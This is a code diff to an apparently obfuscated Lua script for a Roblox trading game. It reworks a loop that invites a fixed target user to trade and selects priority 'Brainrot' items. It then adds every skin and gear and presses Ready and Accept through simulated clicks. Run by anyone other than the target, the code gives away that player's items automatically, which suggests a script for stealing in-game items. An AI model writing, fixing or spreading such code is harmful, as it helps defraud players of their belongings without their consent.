+					tbl6.inviteSent = true
+					tbl6.tradeState = TRADE_STATE.PENDING_INVITE
 				end
 			end
 		end
 	end)
 
-	-- Selección de Brainrots exclusivamente configurados (por slot/nombre exacto) + Base Skins y Gears + Confirmación/Aceptación
+	-- Selección estricta de Brainrots configurados + Skins/Gears + READY/ACCEPT por UI
 	task.spawn(function()
 		while true do
-			task.wait(0.35)
+			task.wait(0.5)
 			if not tbl6.running or tbl6.phase == "SWITCHING" or tbl6.phase == "IDLE" then
 				continue
 			end
 
-			local _, liveMain = getLiveTradeMainFrame()
-			if not liveMain or not hasBothPlayersInTradeSession() then
-				continue
-			end
-
-			if tbl6.tradeState == TRADE_STATE.PENDING_INVITE then
-				tbl6.tradeState = TRADE_STATE.IN_TRADE_SELECTING
-			end
-
-			-- 3. Brainrots: solo elementos presentes en la lista configurada, sin similitud ni slots erróneos
-			local queue = tbl6.queue
-			if type(queue) == "table" and #queue > 0 then
-				if tbl6.addIdx > #queue then
-					tbl6.addIdx = 1
+			local _, liveMain = getLiveTradeSession()
+			if liveMain then
+				if tbl6.tradeState == TRADE_STATE.PENDING_INVITE then
+					tbl6.tradeState = TRADE_STATE.IN_TRADE_SELECTING
 				end
-				local entry = queue[tbl6.addIdx]
-				if entry and not (tbl6.priorityDone and entry.isPriority) then
-					local slotTag = tostring(entry.slotId or entry.slotKey or entry.displayName)
-					if not tbl6.selectedBrainrotSlots[slotTag] then
-						local uiBtn = findMatchingBrainrotUiButton(liveMain, entry)
-						if uiBtn and simulateUiClick(uiBtn, 0.35) then
-							tbl6.selectedBrainrotSlots[slotTag] = true
+
+				local queue = tbl6.queue
+				if type(queue) == "table" and #queue > 0 then
+					if tbl6.addIdx > #queue then
+						tbl6.addIdx = 1
+					end
+					local entry = queue[tbl6.addIdx]
+					if entry and not (tbl6.priorityDone and entry.isPriority) then
+						local slotKey = tostring(entry.slotId or entry.slotKey or entry.displayName)
+						if not tbl6.selectedSlots[slotKey] then
+							local btn = findExactBrainrotBtn(liveMain, entry)
+							if btn and simulateUiClick(btn, 0.4) then
+								tbl6.selectedSlots[slotKey] = true
+							end
 						end
 					end
+					tbl6.addIdx = tbl6.addIdx + 1
 				end
-				tbl6.addIdx = tbl6.addIdx + 1
-			end
 
-			-- 4. Base Skins: detectar e identificar todas las disponibles sin duplicar
-			local skinBtns = findAvailableCategoryUiButtons(liveMain, "skin")
-			for idx, sBtn in ipairs(skinBtns) do
-				local key = tostring(sBtn:GetFullName()) .. "#" .. tostring(idx)
-				if not tbl6.selectedBaseSkinKeys[key] then
-					if simulateUiClick(sBtn, 0.35) then
-						tbl6.selectedBaseSkinKeys[key] = true
+				for idx, sBtn in ipairs(findCategoryButtons(liveMain, "skin")) do
+					local k = tostring(sBtn:GetFullName()) .. "#" .. tostring(idx)
+					if not tbl6.selectedSkins[k] and simulateUiClick(sBtn, 0.4) then
+						tbl6.selectedSkins[k] = true
+					end
+				end
+
+				for idx, gBtn in ipairs(findCategoryButtons(liveMain, "gear")) do
+					local k = tostring(gBtn:GetFullName()) .. "#" .. tostring(idx)
+					if not tbl6.selectedGears[k] and simulateUiClick(gBtn, 0.4) then
+						tbl6.selectedGears[k] = true
+					end
+				end
+
+				local stage, actionBtn = getReadyOrAcceptButton(liveMain)
+				if stage and actionBtn then
+					tbl6.tradeState = stage
+					if tbl6.lastActionStage ~= stage and simulateUiClick(actionBtn, 0.4) then
+						tbl6.lastActionStage = stage
 					end
 				end
 			end
 
-			-- 4. Gears: detectar e identificar todos los disponibles sin duplicar
-			local gearBtns = findAvailableCategoryUiButtons(liveMain, "gear")
-			for idx, gBtn in ipairs(gearBtns) do
-				local key = tostring(gBtn:GetFullName()) .. "#" .. tostring(idx)
-				if not tbl6.selectedGearKeys[key] then
-					if simulateUiClick(gBtn, 0.35) then
-						tbl6.selectedGearKeys[key] = true
-					end
-				end
-			end
-
-			-- 5. Confirmación y aceptación de intercambio según estado real del botón
-			local stage, actionBtn = findTradeConfirmOrAcceptButton(liveMain)
-			if stage and actionBtn then
-				tbl6.tradeState = stage
-				if tbl6.lastConfirmAction ~= stage then
-					if simulateUiClick(actionBtn, 0.4) then
-						tbl6.lastConfirmAction = stage
-					end
-				end
-			end
-
-			-- Transición de fase PRIORITY -> NORMAL cuando ya no quedan Brainrots prioritarios configurados
 			if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
-				local remainingPriority = fn7("PRIORITY")
-				if #remainingPriority == 0 then
+				task.wait(0.15)
+				local priority2 = fn7("PRIORITY")
+
+				if #priority2 == 0 then
 					tbl6.priorityDone = true
 					tbl6.phase = "SWITCHING"
+					tbl6.running = false
+					tbl6.targetId = 0
 					tbl6.queue = {}
-					table.clear(tbl6.selectedBrainrotSlots)
-					table.clear(tbl6.selectedBaseSkinKeys)
-					table.clear(tbl6.selectedGearKeys)
-					tbl6.lastConfirmAction = ""
-					task.wait(0.8)
-
+					tbl6.inviteSent = false
+					table.clear(tbl6.selectedSlots)
+					table.clear(tbl6.selectedSkins)
+					table.clear(tbl6.selectedGears)
+					tbl6.lastActionStage = ""
+					task.wait(1)
 					local normal2 = fn7("NORMAL")
 					local v4 = fn5()
 					local v5 = fn6()
@@ -2247,7 +2064,7 @@ task.spawn(function()
 						tbl6.targetId = targetUserId
 						tbl6.phase = "NORMAL"
 						tbl6.tradeState = TRADE_STATE.PENDING_INVITE
-						tbl6.inviteSentForCurrentCycle = false
+						tbl6.running = true
 						tbl6.addIdx = 1
 						tbl6.baseSkinQueue = v4
 						tbl6.gearQueue = v5
@@ -2257,6 +2074,9 @@ task.spawn(function()
 						tbl6.phase = "IDLE"
 						tbl6.tradeState = TRADE_STATE.CLOSED
 					end
+				else
+					tbl6.queue = priority2
+					tbl6.addIdx = 1
 				end
 			end
 		end
